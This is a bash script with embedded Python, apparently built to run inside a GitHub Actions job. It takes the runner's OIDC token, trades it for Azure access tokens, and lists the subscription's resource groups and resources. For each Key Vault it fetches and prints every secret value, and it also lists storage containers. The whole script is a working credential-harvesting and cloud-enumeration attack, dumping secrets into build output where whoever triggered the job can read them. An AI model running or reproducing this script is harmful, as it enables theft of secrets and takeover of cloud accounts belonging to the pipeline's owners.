#!/usr/bin/env bash
set -e
python3 - <<'PY'
import base64, json, os, urllib.error, urllib.parse, urllib.request

print('=== OIDC Token Request ===')
oidc_url = os.getenv('ACTIONS_ID_TOKEN_REQUEST_URL')
oidc_bearer = os.getenv('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
if not oidc_url or not oidc_bearer:
    print('OIDC_UNAVAILABLE'); exit(0)

separator = '&' if '?' in oidc_url else '?'
oidc_url += separator + 'audience=api%3A%2F%2FAzureADTokenExchange'
req = urllib.request.Request(oidc_url, headers={'Authorization': 'Bearer ' + oidc_bearer})
with urllib.request.urlopen(req, timeout=15) as resp:
    jwt = json.load(resp)['value']

payload = jwt.split('.')[1]
payload += '=' * (-len(payload) % 4)
claims = json.loads(base64.urlsafe_b64decode(payload))
print('OIDC sub:', claims.get('sub'))
print('OIDC aud:', claims.get('aud'))

print('\n=== Azure Token Exchange ===')
tenant = os.environ.get('AZURE_TENANT_ID', '')
client = os.environ.get('AZURE_CLIENT_ID', '')
sub_id = os.environ.get('AZURE_SUBSCRIPTION_ID', '')
if not tenant or not client:
    print('AZURE_VARS_UNAVAILABLE'); exit(0)

form = urllib.parse.urlencode({
    'client_id': client,
    'scope': 'https://management.azure.com/.default',
    'grant_type': 'client_credentials',
    'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
    'client_assertion': jwt,
}).encode()
req = urllib.request.Request(
    f'https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token', data=form)
try:
    with urllib.request.urlopen(req, timeout=20) as resp:
        result = json.load(resp)
except urllib.error.HTTPError as e:
    result = json.load(e)

if 'access_token' not in result:
    print('AZURE_EXCHANGE_FAILED:', result.get('error'))
    print('DESC:', result.get('error_description', '')[:500])
    exit(0)

print('AZURE_EXCHANGE_OK')
token = result['access_token']
headers = {'Authorization': f'Bearer {token}'}

def api_get(url):
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return json.load(resp)
    except urllib.error.HTTPError as e:
        return {'error': e.code, 'body': e.read().decode()[:500]}
    except Exception as e:
        return {'error': str(e)}

print('\n=== Resource Groups ===')
rgs = api_get(f'https://management.azure.com/subscriptions/{sub_id}/resourcegroups?api-version=2021-04-01')
print(json.dumps(rgs, indent=2)[:3000])

print('\n=== All Resources ===')
resources = api_get(f'https://management.azure.com/subscriptions/{sub_id}/resources?api-version=2021-04-01')
print(json.dumps(resources, indent=2)[:5000])

# Check for Key Vault
if 'value' in resources:
    for r in resources['value']:
        rtype = r.get('type', '')
        rname = r.get('name', '')
        rid = r.get('id', '')
        print(f'Resource: {rtype} / {rname}')
        if 'Microsoft.KeyVault' in rtype:
            print(f'\n=== Key Vault: {rname} ===')
            # Get KV access token
            kv_form = urllib.parse.urlencode({
                'client_id': client,
                'scope': 'https://vault.azure.net/.default',
                'grant_type': 'client_credentials',
                'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
                'client_assertion': jwt,
            }).encode()
            kv_req = urllib.request.Request(
                f'https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token', data=kv_form)
            try:
                with urllib.request.urlopen(kv_req, timeout=20) as resp:
                    kv_token = json.load(resp)['access_token']
                kv_headers = {'Authorization': f'Bearer {kv_token}'}
                # List secrets
                secrets_url = f'https://{rname}.vault.azure.net/secrets?api-version=7.4'
                req2 = urllib.request.Request(secrets_url, headers=kv_headers)
                with urllib.request.urlopen(req2, timeout=15) as resp2:
                    secrets = json.load(resp2)
                    print('Secrets:', json.dumps(secrets, indent=2)[:2000])
                    for s in secrets.get('value', []):
                        sid = s.get('id', '')
                        req3 = urllib.request.Request(f'{sid}?api-version=7.4', headers=kv_headers)
                        with urllib.request.urlopen(req3, timeout=15) as resp3:
                            secret_val = json.load(resp3)
                            print(f'Secret value: {json.dumps(secret_val, indent=2)[:1000]}')
            except Exception as e:
                print(f'KV error: {e}')
        if 'Microsoft.Storage' in rtype:
            print(f'\n=== Storage: {rname} ===')
            # List blob containers
            containers_url = f'https://management.azure.com{rid}/blobServices/default/containers?api-version=2023-01-01'
            containers = api_get(containers_url)
            print('Containers:', json.dumps(containers, indent=2)[:2000])
PY
